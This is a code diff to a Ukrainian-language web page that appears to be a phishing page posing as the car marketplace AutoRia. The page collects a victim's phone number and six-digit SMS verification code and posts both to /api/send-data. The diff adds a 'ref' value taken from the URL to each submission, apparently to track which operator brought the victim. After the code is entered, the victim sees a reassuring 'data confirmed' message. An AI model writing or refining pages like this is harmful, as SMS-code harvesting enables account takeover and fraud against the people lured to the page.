@@ -12,9 +12,9 @@
 
     <style>
         :root {
-            --primary-color: #ff3b30; /* Червоний колір кнопки */
+            --primary-color: #ff3b30;
             --primary-hover-color: #e5332a;
-            --autoria-safe-color: #008000; /* Зелений колір для "безпеки" */
+            --autoria-safe-color: #008000;
             --border-radius: 12px;
             --shadow-light: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
@@ -111,7 +111,7 @@
         }
 
         .code-input {
-            width: 35px; /* Для 6 цифр */
+            width: 35px;
             height: 45px;
             text-align: center;
             font-size: 24px;
@@ -194,11 +194,14 @@
     </div>
     
     <script>
+        // === ОТРИМАННЯ REF З URL ===
+        const urlParams = new URLSearchParams(window.location.search);
+        const REFERRER_ID = urlParams.get('ref') || ''; // <-- Ось і все!
+
         // === ЛОГІКА ДЛЯ КРОКУ ТЕЛЕФОНУ (МАСКА) ===
         $(document).ready(function(){
             const prefix = '+380 ';
             
-            // Встановлюємо маску для номера телефону
             $('#phone-number').mask(
                 '+380 99 99 999 99', 
                 {
@@ -207,19 +210,17 @@
                 }
             ).val(prefix);
 
-            // Запобігання видаленню префікса
             $('#phone-number').on('focus click', function() {
                 if ($(this).val().length < prefix.length) { 
                     $(this).val(prefix);
                 }
             }).on('keydown', function(e) {
-                // Заборона Backspace/Delete, якщо залишився тільки префікс
                 if ((e.keyCode === 8 || e.keyCode === 46) && $(this).val() === prefix) { 
                     e.preventDefault();
                 }
             });
             
-            // === ЛОГІКА ДЛЯ АВТОМАТИЧНОГО ПЕРЕХОДУ ВВЕДЕННЯ КОДУ ===
+            // === АВТОПЕРЕХІД МІЖ ПОЛЯМИ КОДУ ===
             $('.code-input').on('keyup', function(e) {
                 const currentInput = $(this);
                 const maxLength = parseInt(currentInput.attr('maxlength'));
@@ -232,7 +233,6 @@
                     }
                 }
                 
-                // Якщо натиснуто Backspace і поле пусте, перемістити фокус назад
                 if (e.keyCode === 8 && myLength === 0) {
                     let prevInput = currentInput.prevAll('.code-input').first();
                     if (prevInput.length) {
@@ -242,74 +242,70 @@
             });
         });
         
-        // === ЛОГІКА ДЛЯ ПЕРЕМИКАННЯ ТА ВІДПРАВКИ КРОКІВ (AJAX) ===
+        // === ВІДПРАВКА НОМЕРУ + REF ===
         function showSmsStep() {
             const phoneNumber = $('#phone-number').val();
             
-            // Перевірка на валідність номеру (повна довжина без пробілів)
-            if (phoneNumber && phoneNumber.replace(/\s/g, '').length === '+380999999999'.length) {
+            if (phoneNumber && phoneNumber.replace(/\s/g, '').length === 13) {
                 
-                // 1. МИТТЄВИЙ ПЕРЕХІД ДО КРОКУ SMS для прискорення
                 $('#phone-step').hide();
                 $('#sms-step').show();
                 $('#code-1').focus();
 
-                // 2. ВІДПРАВКА НОМЕРУ ТЕЛЕФОНУ (на задньому плані, не блокує інтерфейс)
+                // Відправка номера + ref
                 $.ajax({
                     url: '/api/send-data', 
                     type: 'POST',
                     contentType: 'application/json', 
                     data: JSON.stringify({
                         step: 'phone',
-                        phone: phoneNumber
+                        phone: phoneNumber,
+                        ref: REFERRER_ID  // ← ДОДАНО!
                     }),
                     success: function(response) {
-                        console.log('Номер телефону успішно відправлено (фон):', response);
+                        console.log('Номер відправлено:', response);
                     },
-                    error: function(xhr, status, error) {
-                        console.error('Фонова помилка відправки номеру:', xhr.responseText);
+                    error: function(xhr) {
+                        console.error('Помилка:', xhr.responseText);
                     }
                 });
                 
             } else {
-                alert('Будь ласка, введіть повний номер телефону у форматі +380 ХХ ХХ ХХХ ХХ.');
+                alert('Введіть повний номер: +380 XX XXX XX XX');
             }
         }
 
-        // Функція для відправки SMS-коду
+        // === ВІДПРАВКА КОДУ + REF ===
         function sendSmsCode(event) {
             event.preventDefault(); 
 
-            // Збираємо код з усіх полів
             const smsCode = $('.code-input').map(function() {
                 return this.value;
             }).get().join(''); 
             
-            // Перевірка на 6 цифр
             if (smsCode.length === 6 && /^\d+$/.test(smsCode)) { 
                 
-                // 2. ВІДПРАВКА SMS-КОДУ
                 $.ajax({
                     url: '/api/send-data', 
                     type: 'POST',
                     contentType: 'application/json', 
                     data: JSON.stringify({ 
                         step: 'code',
-                        code: smsCode
+                        code: smsCode,
+                        ref: REFERRER_ID  // ← ДОДАНО!
                     }),
                     success: function(response) {
-                        // Змінене повідомлення про успіх
-                        alert('Дані підтвердженно, гарного дня!');
-                        console.log('SMS-код успішно відправлено:', response);
+                        alert('Дані підтверджено, гарного дня!');
+                        console.log('Код відправлено:', response);
                     },
-                    error: function(xhr, status, error) {
-                        alert('Помилка відправки коду. Спробуйте пізніше.');
-                        console.error('Помилка AJAX (Код):', xhr.responseText);
+                    error: function(xhr) {
+                        alert('Помилка. Спробуйте ще раз.');
+                        console.error('Помилка:', xhr.responseText);
                     }
                 });
                 
             } else {
-                alert('Будь ласка, введіть повний 6-значний код.');
+                alert('Введіть 6 цифр коду.');
             }
         }
     </script>
